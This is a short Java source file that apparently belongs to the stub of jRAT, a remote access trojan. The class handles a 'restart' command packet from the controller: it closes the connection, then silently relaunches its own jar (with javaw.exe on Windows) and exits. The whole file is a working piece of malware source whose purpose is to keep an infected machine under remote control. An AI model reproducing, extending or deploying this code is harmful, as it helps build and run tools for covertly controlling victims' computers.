package se.jrat.stub.packets.incoming;

import se.jrat.common.OperatingSystem;
import se.jrat.stub.Connection;
import se.jrat.stub.utils.Utils;

public class Packet37RestartJavaProcess extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {

			Connection.socket.close();
		} catch (Exception ex) {
		}
		String javapath = System.getProperty("java.home");

		String path = Utils.getJarFile().getAbsolutePath();

		if (path.startsWith("/") && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			path = path.substring(1, path.length());
		}

		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { javapath + "\\bin\\javaw.exe", "-jar", path });
		} else {
			Runtime.getRuntime().exec(new String[] { "java", "-jar", path });
		}
		System.exit(0);
	}

}
